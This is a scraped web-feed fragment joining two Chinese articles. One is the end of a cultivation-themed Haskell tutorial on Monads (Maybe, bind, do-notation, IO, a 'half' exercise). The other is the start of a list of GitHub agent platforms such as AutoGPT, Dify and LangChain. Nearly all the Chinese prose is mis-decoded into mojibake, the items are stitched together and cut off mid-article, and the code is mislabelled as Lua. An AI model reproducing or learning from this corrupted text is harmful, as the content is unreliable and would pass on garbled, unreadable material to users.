pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æ¬¢è¿é“å‹æ¥åˆ°<strong>ç¬¬äº”ç« </strong>ã€‚å¦‚æœè¯´ä¹‹å‰çš„ç­‘åŸºä¸ç»“ä¸¹åªæ˜¯å¯¹â€œæœ¯â€çš„ç£¨ç»ƒï¼Œé‚£ä¹ˆè¿™ä¸€ç« ï¼Œæˆ‘ä»¬å°†æ­£å¼è¿æ¥ä¿®ä»™è·¯ä¸Šæœ€è‘—åçš„å¤©åŠ«â€”â€”<strong>å…ƒå©´æœŸï¼šMonadï¼ˆå•å­ï¼‰æ‚Ÿé“</strong>ã€‚</p>
<p>åœ¨ Î» é—¨çš„ä¼ è¯´ä¸­ï¼Œæœ‰è¿™æ ·ä¸€å¥è¯ï¼šâ€œMonad æ˜¯è‡ªå‡½å­èŒƒç•´ä¸Šçš„ä¸€ä¸ªå•å­å¯¹è±¡ï¼Œè¿™æœ‰ä»€ä¹ˆéš¾ç†è§£çš„ï¼Ÿâ€â€”â€”è¿™å°±æ˜¯è‘—åçš„**â€œå…ƒå©´æœŸå¿ƒé­”â€**ã€‚ä»Šå¤©ï¼Œæˆ‘ä»¬ä¸è°ˆæ¯ç‡¥çš„èŒƒç•´è®ºï¼Œåªè°ˆå¦‚ä½•é©¾é©­å®ƒã€‚</p>
<hr/>
<p>åœ¨çº¯ç²¹çš„ Haskell ä¸–ç•Œé‡Œï¼Œå‡½æ•°æ˜¯æå…¶â€œå­¤å‚²â€çš„ï¼Œå®ƒä»¬ä¸å‡†è§¦ç¢°å°˜ä¸–ï¼ˆå‰¯ä½œç”¨ï¼‰ï¼Œä¸å‡†äº§ç”Ÿæ„å¤–ã€‚ä½†åœ¨å®æˆ˜ä¸­ï¼Œä½ æ€»ä¼šé‡åˆ°ï¼š</p>
<ol>
<li><strong>ä¸ç¡®å®šæ€§ï¼š</strong> è¿™æ¬¡ç‚¼ä¸¹å¯èƒ½ä¼šç‚¸ç‚‰ï¼ˆ<code>Maybe</code>ï¼‰ã€‚</li>
<li><strong>å¤šé‡å› æœï¼š</strong> ä¸€ä¸ªå’’è¯­å¯èƒ½å¹»åŒ–å‡ºå¤šä¸ªåˆ†èº«ï¼ˆ<code>List</code>ï¼‰ã€‚</li>
<li><strong>å‡¡å°˜äº¤äº’ï¼š</strong> ä½ éœ€è¦è¯»å–è¯»è€…çš„ç¥è¯†æˆ–åœ¨çŸ³ç¢‘ä¸Šåˆ»å­—ï¼ˆ<code>IO</code>ï¼‰ã€‚</li>
</ol>
<p><strong>Monad</strong>ï¼Œå°±æ˜¯ä¸ºäº†å¤„ç†è¿™äº›â€œå¸¦æœ‰é¢å¤–æ°”æ¯â€çš„ä»·å€¼è€Œå­˜åœ¨çš„<strong>é«˜çº§æ³•é˜µ</strong>ã€‚</p>
<h3 data-id="heading-0">5.1 æ³•é˜µçš„æ ¸å¿ƒï¼šå¸¦ç€â€œä¸Šä¸‹æ–‡â€çš„ç›’å­</h3>
<p>ä½ å¯ä»¥æŠŠ Monad çœ‹ä½œä¸€ä¸ª<strong>ç¥å¥‡çš„ç›’å­ï¼ˆContextï¼‰</strong> ã€‚</p>
<ul>
<li><code>a</code> æ˜¯ç›’å­é‡Œçš„å®è´ï¼ˆçº¯å‡€çš„å€¼ï¼‰ã€‚</li>
<li><code>m a</code> åˆ™æ˜¯è¢«æ³•é˜µåŒ…è£¹ç€çš„å®è´ã€‚</li>
</ul>
<h3 data-id="heading-1">5.2 æ ¸å¿ƒç§˜ç±ï¼šç»‘å®šè¿ç®—ç¬¦ <code>&gt;&gt;=</code> (Bind)</h3>
<p>åœ¨å‡¡é—´ï¼Œä½ å¯èƒ½ä¼šå†™ï¼šy = f(x); z = g(y)ã€‚</p>
<p>ä½†åœ¨ Monad é˜µæ³•é‡Œï¼Œå› ä¸ºå€¼è¢«åŒ…è£¹åœ¨ç›’å­é‡Œï¼Œä½ æ²¡æ³•ç›´æ¥æŠŠå®ƒå–‚ç»™ä¸‹ä¸€ä¸ªå‡½æ•°ã€‚è¿™æ—¶ä½ éœ€è¦ &gt;&gt;=ï¼ˆç»‘å®šï¼‰ï¼š</p>
<blockquote>
<p><strong>å¿ƒæ³•ï¼š</strong> å®ƒä¼šå¸®ä½ æ‰“å¼€å½“å‰çš„ç›’å­ï¼Œå–å‡ºå®è´ï¼Œäº¤ç»™ä¸‹ä¸€ä¸ªæ³•æœ¯å¤„ç†ï¼Œå¤„ç†å®Œåå†æŠŠç»“æœå¦¥å–„åœ°æ”¾å›æ–°ç›’å­é‡Œã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-2">5.3 ç¬¬ä¸€å°Š Monadï¼šMaybeï¼ˆè™šå®ä¹‹é“ï¼‰</h3>
<p>è¿™æ˜¯æœ€é€‚åˆæ„Ÿæ‚Ÿ Monad çš„é˜µæ³•ã€‚å®ƒå¤„ç†çš„æ˜¯**â€œå¯èƒ½å¤±è´¥â€**çš„å› æœã€‚</p>
<ul>
<li><code>Just a</code>ï¼šç»ƒæˆäº†ï¼Œç›’å­é‡Œæœ‰å®è´ã€‚</li>
<li><code>Nothing</code>ï¼šç‚¸ç‚‰äº†ï¼Œç›’å­é‡Œç©ºæ— ä¸€ç‰©ã€‚</li>
</ul>
<p>æ¼”ç»ƒï¼šè¿ç»­ç‚¼ä¸¹</p>
<p>å‡è®¾æœ‰ä¸‰ä¸ªæ³•æœ¯ï¼Œæ¯ä¸ªéƒ½æœ‰å‡ ç‡å¤±è´¥ã€‚</p>
<p>Haskell</p>
<pre><code class="hljs language-lua" lang="lua"><span class="hljs-comment">-- å¦‚æœæ²¡æœ‰ Monadï¼Œä½ å¾—å†™æ— æ•°å±‚ if-else</span>
<span class="hljs-comment">-- æœ‰äº† Monadï¼Œå› æœä¼šè‡ªåŠ¨ä¼ é€’</span>
attemptAlchemy :: Material -&gt; Maybe Gold
attemptAlchemy m = 
    refine m &gt;&gt;=        <span class="hljs-comment">-- æç‚¼ï¼Œå¯èƒ½å¤±è´¥</span>
    crystallize &gt;&gt;=     <span class="hljs-comment">-- ç»“æ™¶ï¼Œå¯èƒ½å¤±è´¥</span>
    enchant             <span class="hljs-comment">-- é™„é­”ï¼Œå¯èƒ½å¤±è´¥</span>
</code></pre>
<p><strong>ç¥æ•ˆï¼š</strong> åªè¦å…¶ä¸­ä»»ä½•ä¸€æ­¥å˜æˆ <code>Nothing</code>ï¼ˆç‚¸ç‚‰ï¼‰ï¼Œåç»­æ‰€æœ‰çš„ <code>&gt;&gt;=</code> éƒ½ä¼šç›´æ¥è·³è¿‡ï¼Œæœ€ç»ˆç»“æœè‡ªåŠ¨å˜æˆ <code>Nothing</code>ã€‚è¿™å«**â€œä¸€è£ä¿±è£ï¼Œä¸€æŸä¿±æŸâ€**ã€‚</p>
<hr/>
<h3 data-id="heading-3">5.4 ç®€åŒ–å’’è¯­ï¼šDo-Notationï¼ˆçœŸè¨€æœ¯ï¼‰</h3>
<p>ä¸ºäº†è®©ä¿®ä»™è€…å†™ä»£ç æ›´é¡ºæ‰‹ï¼Œå¤©é“èµä¸‹äº† <strong><code>do</code> è®°æ³•</strong>ã€‚å®ƒè®© Monad çš„æ“ä½œçœ‹èµ·æ¥åƒå‡¡é—´çš„é¡ºåºæ‰§è¡Œï¼Œä½†å†…æ ¸ä¾ç„¶ä¿æŒçº¯ç²¹ã€‚</p>
<p>Haskell</p>
<pre><code class="hljs language-lua" lang="lua"><span class="hljs-comment">-- ä¸Šé¢çš„ç‚¼ä¸¹è¿‡ç¨‹å¯ä»¥å†™æˆï¼š</span>
alchemyInDo m = <span class="hljs-keyword">do</span>
    refined &lt;- refine m       <span class="hljs-comment">-- ä»ç›’å­é‡Œå–å‡ºå®è´</span>
    crystal &lt;- crystallize refined
    enchant crystal           <span class="hljs-comment">-- æœ€åä¸€å‡»ï¼Œç•™åœ¨ç›’å­é‡Œ</span>
</code></pre>
<hr/>
<h3 data-id="heading-4">5.5 æœ€å±é™©çš„é˜µæ³•ï¼šIO Monad</h3>
<p>åœ¨ Haskell ä¸­ï¼Œæ‰€æœ‰ä¸ç°å®ä¸–ç•Œçš„äº¤äº’ï¼ˆè¯»å†™æ–‡ä»¶ã€æ§åˆ¶å°è¾“å‡ºï¼‰éƒ½è¢«å›šç¦åœ¨ <code>IO</code> è¿™ä¸ªå¤§é˜µä¸­ã€‚</p>
<ul>
<li>ä½ ä¸èƒ½ä» <code>IO String</code> é‡ŒæŠŠ <code>String</code> æ°¸ä¹…å–å‡ºæ¥å˜æˆçº¯ç²¹çš„ <code>String</code>ã€‚</li>
<li>ä¸€æ—¦ä½ æŸ“æŒ‡äº†å‡¡å°˜ï¼ˆIOï¼‰ï¼Œä½ çš„æ•´ä¸ªæ³•æœ¯åºåˆ—éƒ½ä¼šè¢«æ‰“ä¸Š <code>IO</code> çš„çƒ™å°ã€‚</li>
</ul>
<p>è¿™ä¿è¯äº†**â€œä»™å‡¡æœ‰åˆ«â€**ï¼šçº¯ç²¹çš„é€»è¾‘æ°¸è¿œä¸ä¼šè¢«å¤šå˜çš„ç°å®ä¸–ç•Œæ‰€æ±¡æŸ“ã€‚</p>
<hr/>
<h2 data-id="heading-5">ğŸ“œ å…ƒå©´è¯•ç‚¼ï¼šç¬¬äº”å…³</h2>
<p>è¯·åœ¨ä½ çš„é¼ç‚‰ä¸­å¸ƒç½®ä¸€ä¸ªç®€å•çš„ <code>Maybe</code> æ³•é˜µï¼š</p>
<ol>
<li>
<p><strong>å®šä¹‰ä¸¤ä¸ªæ³•æœ¯ï¼š</strong></p>
<ul>
<li><code>half :: Int -&gt; Maybe Int</code>ï¼šå¦‚æœæ˜¯å¶æ•°ï¼Œè¿”å›ä¸€åŠï¼›å¦‚æœæ˜¯å¥‡æ•°ï¼Œè¿”å› <code>Nothing</code>ï¼ˆç‚¸ç‚‰ï¼‰ã€‚</li>
</ul>
</li>
<li>
<p><strong>é“¾å¼æ–½æ³•ï¼š</strong> ä½¿ç”¨ <code>&gt;&gt;=</code> æˆ– <code>do</code> è®°æ³•ï¼Œå°è¯•å°†æ•°å­— <code>20</code> è¿ç»­è¿›è¡Œä¸‰æ¬¡ <code>half</code> æ“ä½œã€‚</p>
<ul>
<li>è¾“å…¥ <code>20</code> æ—¶ï¼Œç»“æœåº”è¯¥æ˜¯ï¼Ÿ</li>
<li>è¾“å…¥ <code>18</code> æ—¶ï¼Œç»“æœåº”è¯¥æ˜¯ï¼Ÿï¼ˆæç¤ºï¼š<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>18</mn><mo>â†’</mo><mn>9</mn><mo>â†’</mo></mrow><annotation encoding="application/x-tex">18 \to 9 \to</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">18</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">â†’</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">9</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">â†’</span></span></span></span></span> ç‚¸ç‚‰ï¼‰</li>
</ul>
</li>
</ol>
<p><strong>â€œå½“ä½ æ˜ç™½äº† Monad ä¸æ˜¯ä¸ºäº†è®©ç®€å•å˜å¤æ‚ï¼Œè€Œæ˜¯ä¸ºäº†è®©å¤æ‚çš„å› æœå˜å¾—æ¸…æ™°å¯æ§æ—¶ï¼Œä½ ä¾¿å·²ç ´å…¥å…ƒå©´ï¼Œç¥è¯†ä¸ç­ã€‚â€</strong></p>
<hr/>
<p><strong>ä¸‹ä¸€ç« é¢„å‘Šï¼š</strong> æ­å–œé“å‹ï¼å…ƒå©´å·²æˆã€‚æ¥ä¸‹æ¥æˆ‘ä»¬å°†è¿æ¥ä¿®ä»™ç•Œçš„æœ€é«˜è£èª‰â€”â€”<strong>åŒ–ç¥æœŸï¼šFunctor (å‡½å­) ä¸ Applicative (åº”ç”¨å‡½å­)</strong> ã€‚ä½ å°†å­¦ä¼šå¦‚ä½•åœ¨ä¸æ‰“å¼€ç›’å­çš„æƒ…å†µä¸‹ï¼Œéš”ç©ºæ“æ§ç›’å†…çš„æ³•å®ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[GitHub ä¸Š 10 ä¸ªä»¤äººæƒŠè‰³çš„ Agent å¼€å‘å¹³å°ï¼Œå¤ªé¡¶äº†ã€‚]]></title>    <link>https://juejin.cn/post/7589176150493741110</link>    <guid>https://juejin.cn/post/7589176150493741110</guid>    <pubDate>2025-12-30T02:40:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589176150493741110" data-draft-id="7589176150493593654" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="GitHub ä¸Š 10 ä¸ªä»¤äººæƒŠè‰³çš„ Agent å¼€å‘å¹³å°ï¼Œå¤ªé¡¶äº†ã€‚"/> <meta itemprop="keywords" content="GitHub"/> <meta itemprop="datePublished" content="2025-12-30T02:40:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é€›é€›GitHub"/> <meta itemprop="url" content="https://juejin.cn/user/1442202996186093"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            GitHub ä¸Š 10 ä¸ªä»¤äººæƒŠè‰³çš„ Agent å¼€å‘å¹³å°ï¼Œå¤ªé¡¶äº†ã€‚
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1442202996186093/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é€›é€›GitHub
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T02:40:59.000Z" title="Tue Dec 30 2025 02:40:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">01ã€AutoGPT</h2>
<p>AutoGPT æ˜¯ AI Agent é¢†åŸŸçš„é¼»ç¥–çº§é¡¹ç›®ï¼Œç°åœ¨å·²ç» 18 ä¸‡+çš„ Star äº†ã€‚</p>
<p>ä¸èŠå¤©æœºå™¨äººä¸ä¸€æ ·ï¼ŒAutoGPT èƒ½å¤Ÿè‡ªä¸»åœ°å°†ä¸€ä¸ªå¤§ç›®æ ‡æ‹†è§£ä¸ºå­ä»»åŠ¡ï¼Œå¹¶åˆ©ç”¨äº’è”ç½‘æœç´¢ã€æœ¬åœ°æ–‡ä»¶ç­‰æ“ä½œæ¥ä¸€æ­¥æ­¥å®ç°ç›®æ ‡ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d15a803954748b794f8f24af0d1513f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667259&amp;x-signature=7ZSuZwQl0DuecGredJzmwCleVMk%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>AutoGPTÂ å…·å¤‡å¼ºå¤§çš„å·¥å…·è°ƒç”¨å’Œç¯å¢ƒäº¤äº’èƒ½åŠ›ã€‚</p>
<p>å®ƒèƒ½å¤Ÿé€šè¿‡è®¿é—®äº’è”ç½‘æœç´¢æœ€æ–°ä¿¡æ¯ã€ç®¡ç†æœ¬åœ°æ–‡ä»¶çš„è¯»å†™ã€æ‰§è¡Œä»£ç ä»¥åŠä¿ç•™é•¿æœŸå’ŒçŸ­æœŸè®°å¿†æ¥è¾…åŠ©å†³ç­–ã€‚</p>
<p>æ ¸å¿ƒæœºåˆ¶æ˜¯ä¸€ä¸ªæ€è€ƒ-è®¡åˆ’-è¡ŒåŠ¨çš„å¾ªç¯ï¼šæ¨¡å‹ä¼šè¯„ä¼°å½“å‰çŠ¶æ€ï¼Œåˆ¶å®šä¸‹ä¸€æ­¥è®¡åˆ’ï¼Œæ‰§è¡Œæ“ä½œï¼Œå¹¶æ ¹æ®åé¦ˆç»“æœè¿›è¡Œè‡ªæˆ‘ä¿®æ­£ï¼Œè¿™ä½¿å¾—å®ƒèƒ½å¤Ÿå¤„ç†æ¯”å•ä¸€å¯¹è¯æ›´å¤æ‚ã€è€—æ—¶æ›´é•¿çš„è‡ªåŠ¨åŒ–å·¥ä½œæµã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7831bb35425246cd8064ef98b24fcb56~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667259&amp;x-signature=apxu09aN1u6De4lw0PMmgMH99jA%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>AutoGPT è¿™ä¸ªå¼€æºé¡¹ç›®ç»å¯¹æ˜¯æ¨åŠ¨ AI Agent é¢†åŸŸçš„å¿«é€Ÿå‘å±•ï¼Œæ˜¯ç ”ç©¶è‡ªä¸»æ™ºèƒ½ä½“ï¼ˆAutonomous Agentsï¼‰çš„å¿…çœ‹é¡¹ç›®ã€‚</p>
<pre><code class="hljs language-arduino" lang="arduino">å¼€æºåœ°å€:Â https:<span class="hljs-comment">//github.com/Significant-Gravitas/AutoGPT</span>
</code></pre>
<h2 data-id="heading-1">02ã€Dify</h2>
<p>Dify ç›®å‰ 12 ä¸‡+ çš„ Star äº†ã€‚</p>
<p>å®ƒä¸ä»…ä»…æ˜¯ Agent æ¡†æ¶ï¼Œè¿˜æ˜¯èåˆäº†Â Backend-as-a-Service (BaaS)Â å’ŒÂ LLMOpsÂ ç†å¿µçš„å¤§æ¨¡å‹åº”ç”¨å¼€å‘å¹³å°ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a43a64ad52f243cb8683e667c9fbf1d6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667259&amp;x-signature=HvrUAGWq1Uk7y5G0U9drAFhW%2Bpg%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å®ƒæä¾›äº†å¯è§†åŒ–çš„ Prompt ç¼–æ’ã€è¿è¥ç®¡ç†ã€çŸ¥è¯†åº“ RAG é›†æˆç­‰åŠŸèƒ½ã€‚</p>
<p>é€šè¿‡ Difyï¼Œä¸éœ€è¦ä»å¤´ç¼–å†™åç«¯ä»£ç ï¼Œå³å¯å¿«é€Ÿå°†ç®€å•çš„ Prompt è½¬åŒ–ä¸ºåŠŸèƒ½å®Œå¤‡ã€å¯æŠ•å…¥ç”Ÿäº§çš„ AI åº”ç”¨ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fcbe7e91c4684989b65eeb05fd5b7cb7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667259&amp;x-signature=Lq5w%2B65jpboqWSCjLIBNgTJ1Q3o%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>Dify æ”¯æŒå¯è§†åŒ–ç¼–æ’ï¼Œæ‹–æ‹½èŠ‚ç‚¹æ¥å®šä¹‰å¤æ‚çš„ Agent é€»è¾‘å’Œå·¥å…·è°ƒç”¨ã€‚å¹¶ä¸”å†…ç½®äº†é«˜è´¨é‡çš„ RAG å¼•æ“ï¼Œèƒ½å¤Ÿè‡ªåŠ¨å¤„ç†æ–‡æ¡£è§£æã€åˆ†æ®µå’Œå‘é‡åŒ–ï¼Œè½»æ¾æ„å»ºä¼ä¸šçº§çŸ¥è¯†åº“ã€‚</p>
<p>å®ƒæä¾›äº†å¯è§†åŒ–çš„ Prompt ç¼–æ’ã€è¿è¥ç®¡ç†ã€çŸ¥è¯†åº“ RAG é›†æˆç­‰åŠŸèƒ½ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dff16b1fee6d42d780fecfb4cf9fc322~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667259&amp;x-signature=KcTG%2FDNmyxODXdktRaf8JE7iCyA%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å…³äºå®ƒå’Œ Difyã€n8nã€Coze çš„åŒºåˆ«ï¼Œè®© Nano Banana Pro ç”»äº†ä¸€ä¸ªå›¾ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/39f04fc6ff9e4cad9740635e39518e1c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667259&amp;x-signature=COOHlWw1fKrLqAT7Z6XectdHwYQ%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<pre><code class="hljs language-arduino" lang="arduino">å¼€æºåœ°å€:Â https:<span class="hljs-comment">//github.com/langgenius/dify</span>
</code></pre>
<h2 data-id="heading-2">03ã€LangChain</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cd4f409de25840b0ac52430a3278767c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667259&amp;x-signature=G3RAoItbkpnuSCP%2FGLtBeOc3jYM%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>è™½ç„¶ LangChain æ˜¯ä¸€ä¸ªé€šç”¨çš„ LLM å¼€å‘æ¡†æ¶ï¼Œä½†å®ƒç›®å‰æ˜¯æ„å»º Agent çš„äº‹å®æ ‡å‡†åŸºç¡€è®¾æ–½ä¹‹ä¸€ã€‚</p>
<p>å¯¹äºåˆå­¦è€…æ¥è¯´ï¼Œå®ƒçš„å­¦ä¹ æ›²çº¿è¿˜æ˜¯å¾ˆé™¡å³­çš„ï¼Œä¸€æ—¦æŒæ¡äº†ä¼šå‘ç°å®ƒç¡®å®æ˜¯æ„å»ºå¤æ‚é€»è¾‘æœ€ç¨³å¥çš„åœ°åŸºã€‚</p>
